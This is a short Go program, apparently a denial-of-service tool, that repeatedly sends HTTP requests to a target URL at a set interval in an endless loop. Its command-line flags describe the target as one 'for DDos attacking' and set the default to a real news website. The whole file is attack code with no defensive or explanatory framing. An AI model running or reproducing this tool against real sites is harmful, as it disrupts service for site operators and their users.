package main

import (
	"context"
	"flag"
	"io/ioutil"
	"net"
	"net/http"
	"time"
)

var (
	method   string
	target   string
	interval int
)

func init() {
	flag.StringVar(&method, "method", "GET", "method used to attack target uri")
	flag.StringVar(&target, "target", "http://news.baidu.com", "target uri for DDos attacking")
	flag.IntVar(&interval, "interval", 1000, "attacking interval in milliseconds")
}

func httpDial(ctx context.Context, network, addr string) (net.Conn, error) {
	dial := net.Dialer{
		Timeout:   time.Duration(10) * time.Second,
		KeepAlive: time.Duration(60) * time.Second,
	}

	conn, err := dial.Dial(network, addr)
	if err != nil {
		return conn, err

	}

	return conn, err
}

func newHttpClient() *http.Client {
	client := &http.Client{
		Transport: &http.Transport{
			DialContext: httpDial,
		},
	}

	return client
}

func attack() {
	req, _ := http.NewRequest(method, target, nil)
	cli := newHttpClient()
	resp, _ := cli.Do(req)
	defer func() { resp.Body.Close() }()
	ioutil.ReadAll(resp.Body)
}

func attackLoop() {
	for {
		println("attacking ...")
		attack()
		time.Sleep(time.Duration(interval) * time.Millisecond)
	}
}

func main() {
	if !flag.Parsed() {
		flag.Parse()
	}
	attackLoop()
}
